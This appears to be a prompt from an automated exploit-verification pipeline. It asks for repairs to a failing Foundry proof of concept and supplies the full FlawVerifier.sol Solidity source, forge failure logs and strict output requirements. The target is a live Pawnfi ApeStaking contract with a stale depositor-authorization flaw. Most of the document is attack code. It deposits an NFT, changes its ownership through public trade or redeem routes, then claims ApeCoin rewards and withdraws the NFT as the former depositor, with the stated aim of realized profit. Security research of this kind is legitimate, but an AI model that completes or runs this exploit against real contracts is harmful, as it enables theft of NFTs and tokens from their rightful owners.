You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Stale depositor authorization lets a previous owner reclaim transferred deposited NFTs and their staking proceeds
- claim: Deposited NFTs cache `depositor[nftId] = userAddr` when supplied to lending, and `_validOwner` trusts that cached depositor whenever it is non-zero instead of consulting the live gateway/ptoken ownership source. The owner-change stop-stake paths never clear or refresh `depositor`, and `withdraw()` later authorizes solely by `depositor` plus `staker == address(0)`. As a result, after a deposited NFT is sold, redeemed, or liquidated elsewhere in Pawnfi, the old depositor remains authorized inside ApeStaking.
- impact: A previous owner can continue claiming rewards and, once staking is stopped, withdraw the NFT itself from ApeStaking custody even though beneficial ownership has moved to someone else. This enables direct theft of both the NFT principal and associated ApeCoin proceeds from the new rightful owner.
- exploit_paths: ["User deposits an NFT through ApeStaking, which records `depositor[nftId]`.", "The NFT's beneficial ownership changes elsewhere in the Pawnfi gateway/ptoken flow.", "A stop-stake callback removes the staker but leaves `depositor[nftId]` untouched.", "The old depositor calls reward or withdrawal paths and receives ApeCoin and eventually the NFT itself."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721Like {
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function setApprovalForAll(address operator, bool approved) external;
}

interface IERC721EnumerableLike is IERC721Like {
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

interface INftGatewayLike {
    function mintNft(address nftAsset, uint256[] calldata nftIds) external;
    function redeemNft(address nftAsset, uint256[] calldata nftIds) external;
    function marketInfo(address nftAsset) external view returns (address, address, uint256, uint256, bool);
}

interface IPTokenApeStakingLike {
    function getNftOwner(uint256 nftId) external view returns (address);
    function specificTrade(uint256[] memory nftIds) external;
    function randomTrade(uint256 nftIdCount) external returns (uint256[] memory nftIds);
}

interface IApeStakingLike {
    struct DepositInfo {
        uint256[] mainTokenIds;
        uint256[] bakcTokenIds;
    }

    struct StakingInfo {
        address nftAsset;
        uint256 cashAmount;
        uint256 borrowAmount;
    }

    struct PairNft {
        uint128 mainTokenId;
        uint128 bakcTokenId;
    }

    struct PairNftDepositWithAmount {
        uint32 mainTokenId;
        uint32 bakcTokenId;
        uint184 amount;
    }

    struct SingleNft {
        uint32 tokenId;
        uint224 amount;
    }

    function apeCoin() external view returns (address);
    function nftGateway() external view returns (address);
    function pbaycAddr() external view returns (address);
    function pmaycAddr() external view returns (address);
    function feeTo() external view returns (address);
    function setCollectRate(uint256 newCollectRate) external;
    function depositAndBorrowApeAndStake(
        DepositInfo calldata depositInfo,
        StakingInfo calldata stakingInfo,
        SingleNft[] calldata nfts,
        PairNftDepositWithAmount[] calldata nftPairs
    ) external;
    function claimApeCoin(address nftAsset, uint256[] calldata nftIds, PairNft[] calldata nftPairs) external;
    function withdraw(
        uint256[] calldata baycTokenIds,
        uint256[] calldata maycTokenIds,
        uint256[] calldata bakcTokenIds
    ) external;
}

contract OwnershipChangeHelper {
    function approveToken(address token, address spender, uint256 amount) external {
        IERC20Like(token).approve(spender, amount);
    }

    function specificTrade(address pToken, uint256 nftId) external {
        uint256[] memory ids = new uint256[](1);
        ids[0] = nftId;
        IPTokenApeStakingLike(pToken).specificTrade(ids);
    }

    function redeemViaGateway(address gateway, address nftAsset, uint256 nftId) external {
        uint256[] memory ids = new uint256[](1);
        ids[0] = nftId;
        INftGatewayLike(gateway).redeemNft(nftAsset, ids);
    }

    function mintViaGateway(address gateway, address nftAsset, uint256 nftId) external {
        uint256[] memory ids = new uint256[](1);
        ids[0] = nftId;
        INftGatewayLike(gateway).mintNft(nftAsset, ids);
    }

    function sweep(address token, address to) external {
        IERC20Like erc20 = IERC20Like(token);
        require(erc20.transfer(to, erc20.balanceOf(address(this))), "SWEEP_TRANSFER_FAILED");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C;
    address public constant BAYC = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
    address public constant MAYC = 0x60E4d786628Fea6478F785A6d7e704777c86a7c6;
    address public constant BAKC = 0xba30E5F9Bb24caa003E9f2f0497Ad287FDF95623;
    uint256 public constant BASE_PERCENTS = 1e18;

    enum Stage {
        None,
        Preconditions,
        DepositAndStake,
        OwnershipChange,
        RewardClaim,
        StoppedWithdraw,
        Complete
    }

    OwnershipChangeHelper public immutable BUYER;

    address private _profitToken;
    uint256 private _profitAmount;

    Stage public lastStage;
    address public attemptedAsset;
    uint256 public attemptedTokenId;
    bytes32 public lastFailure;

    constructor() {
        BUYER = new OwnershipChangeHelper();
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IApeStakingLike.apeCoin.selector));
        _profitToken = ok && data.length >= 32 ? abi.decode(data, (address)) : address(0);
    }

    function executeOnOpportunity() external {
        IApeStakingLike target = IApeStakingLike(TARGET);
        address ape = target.apeCoin();

        _profitToken = ape;
        uint256 profitBefore = IERC20Like(ape).balanceOf(address(this));
        _profitAmount = 0;
        lastStage = Stage.Preconditions;
        attemptedAsset = address(0);
        attemptedTokenId = 0;
        lastFailure = bytes32(0);

        bool success = _attemptWithHeldAsset(target, MAYC);
        if (!success) {
            success = _attemptWithHeldAsset(target, BAYC);
        }

        if (success) {
            lastStage = Stage.Complete;
        }

        uint256 profitAfter = IERC20Like(ape).balanceOf(address(this));
        if (profitAfter > profitBefore) {
            _profitAmount = profitAfter - profitBefore;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptWithHeldAsset(IApeStakingLike target, address nftAsset) internal returns (bool) {
        if (IERC721Like(nftAsset).balanceOf(address(this)) == 0) {
            lastFailure = nftAsset == MAYC ? keccak256("NO_VERIFIER_HELD_MAYC") : keccak256("NO_VERIFIER_HELD_BAYC");
            return false;
        }

        uint256 apeBalance = IERC20Like(target.apeCoin()).balanceOf(address(this));
        if (apeBalance == 0) {
            lastFailure = keccak256("NO_VERIFIER_HELD_APE_FOR_DIRECT_PATH");
            return false;
        }

        uint256 tokenId;
        try IERC721EnumerableLike(nftAsset).tokenOfOwnerByIndex(address(this), 0) returns (uint256 heldTokenId) {
            tokenId = heldTokenId;
        } catch {
            lastFailure = keccak256("HELD_NFT_NOT_ENUMERABLE");
            return false;
        }
        if (tokenId > type(uint32).max) {
            lastFailure = keccak256("TOKEN_ID_OVERFLOWS_SINGLE_NFT");
            return false;
        }
        if (apeBalance > type(uint224).max) {
            lastFailure = keccak256("APE_BALANCE_OVERFLOWS_SINGLE_NFT");
            return false;
        }

        attemptedAsset = nftAsset;
        attemptedTokenId = tokenId;

        // Path stage 1:
        // verifier deposits its own NFT into ApeStaking, which writes depositor[nftId] = address(this),
        // and stakes verifier-held APE so the position has a staker that can later be cleared by stop-stake.
        lastStage = Stage.DepositAndStake;
        IERC20Like(target.apeCoin()).approve(address(target), type(uint256).max);
        IERC721Like(nftAsset).setApprovalForAll(address(target), true);
        try target.setCollectRate(BASE_PERCENTS) {} catch {}

        IApeStakingLike.DepositInfo memory depositInfo;
        depositInfo.mainTokenIds = new uint256[](1);
        depositInfo.mainTokenIds[0] = tokenId;
        depositInfo.bakcTokenIds = new uint256[](0);

        IApeStakingLike.StakingInfo memory stakingInfo = IApeStakingLike.StakingInfo({
            nftAsset: nftAsset,
            cashAmount: apeBalance,
            borrowAmount: 0
        });

        IApeStakingLike.SingleNft[] memory nfts = new IApeStakingLike.SingleNft[](1);
        nfts[0] = IApeStakingLike.SingleNft({tokenId: _toUint32(tokenId), amount: _toUint224(apeBalance)});
        IApeStakingLike.PairNftDepositWithAmount[] memory pairs = new IApeStakingLike.PairNftDepositWithAmount[](0);

        try target.depositAndBorrowApeAndStake(depositInfo, stakingInfo, nfts, pairs) {
        } catch {
            lastFailure = keccak256("DEPOSIT_AND_STAKE_REVERTED");
            return false;
        }

        // Path stage 2:
        // beneficial ownership must change elsewhere in the Pawnfi gateway/ptoken flow without clearing
        // depositor[nftId]. This verifier only uses public routes:
        // - pToken specificTrade, if a buyer already holds the pre-existing on-chain pToken inventory
        // - nftGateway redeem/mint, if a buyer already holds the required market inventory
        //
        // If neither inventory exists on the verifier/buyer side at this fork state, the exploit path is
        // mechanically blocked for this attempt and we stop rather than pivoting to an unrelated route.
        lastStage = Stage.OwnershipChange;
        if (!_attemptOwnershipChange(target, nftAsset, tokenId)) {
            return false;
        }

        // Path stage 4a:
        // after ownership changed elsewhere, the old depositor should still pass owner checks while
        // depositor[nftId] remains stale, allowing reward extraction.
        // This call is non-fatal because some ownership-change routes may also trigger stop-stake first.
        uint256[] memory singleClaim = new uint256[](1);
        singleClaim[0] = tokenId;
        IApeStakingLike.PairNft[] memory claimPairs = new IApeStakingLike.PairNft[](0);
        lastStage = Stage.RewardClaim;
        try target.claimApeCoin(nftAsset, singleClaim, claimPairs) {} catch {}

        // Path stage 3 + 4b:
        // the stop-stake callback must have cleared staker[nftId] while leaving depositor[nftId] intact.
        // If that happened, the stale depositor can withdraw the NFT itself here.
        lastStage = Stage.StoppedWithdraw;
        uint256[] memory baycIds = new uint256[](nftAsset == BAYC ? 1 : 0);
        uint256[] memory maycIds = new uint256[](nftAsset == MAYC ? 1 : 0);
        uint256[] memory bakcIds = new uint256[](0);
        if (nftAsset == BAYC) {
            baycIds[0] = tokenId;
        } else {
            maycIds[0] = tokenId;
        }

        try target.withdraw(baycIds, maycIds, bakcIds) {
            return true;
        } catch {
            lastFailure = keccak256("OWNERSHIP_CHANGED_BUT_STOPSTAKE_NOT_OBSERVED");
            return false;
        }
    }

    function _attemptOwnershipChange(IApeStakingLike target, address nftAsset, uint256 tokenId) internal returns (bool) {
        address gateway = target.nftGateway();
        (, address pToken, uint256 pieceCount,,) = INftGatewayLike(gateway).marketInfo(nftAsset);

        uint256 verifierPTokenBalance = IERC20Like(pToken).balanceOf(address(this));
        if (verifierPTokenBalance >= pieceCount) {
            require(IERC20Like(pToken).transfer(address(BUYER), pieceCount), "PTOKEN_TRANSFER_FAILED");
            try BUYER.specificTrade(pToken, tokenId) {
                return true;
            } catch {}
        }

        uint256 buyerPTokenBalance = IERC20Like(pToken).balanceOf(address(BUYER));
        if (buyerPTokenBalance >= pieceCount) {
            try BUYER.specificTrade(pToken, tokenId) {
                return true;
            } catch {}
        }

        // Best-effort gateway route for cases where the helper already holds the required lending-side
        // market tokens before executeOnOpportunity() is called by the harness.
        try BUYER.redeemViaGateway(gateway, nftAsset, tokenId) {
            return true;
        } catch {}

        try BUYER.mintViaGateway(gateway, nftAsset, tokenId) {
            return true;
        } catch {}

        lastFailure = keccak256("NO_PUBLIC_OWNERSHIP_CHANGE_ROUTE_FUNDED");
        return false;
    }

    function _toUint32(uint256 value) internal pure returns (uint32) {
        require(value <= type(uint32).max, "UINT32_OVERFLOW");
        return uint32(value);
    }

    function _toUint224(uint256 value) internal pure returns (uint224) {
        require(value <= type(uint224).max, "UINT224_OVERFLOW");
        return uint224(value);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 4.24s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 17557)
Traces:
  [17557] FlawVerifierTest::testExploit()
    ├─ [2367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [8684] FlawVerifier::executeOnOpportunity()
    │   ├─ [2371] 0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C::apeCoin() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [0] 0x0000000000000000000000000000000000000000::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Stop]
    │   └─ ← [Revert] call to non-contract address 0x0000000000000000000000000000000000000000
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.79s (21.27ms CPU time)

Ran 1 test suite in 1.87s (1.79s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 17557)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
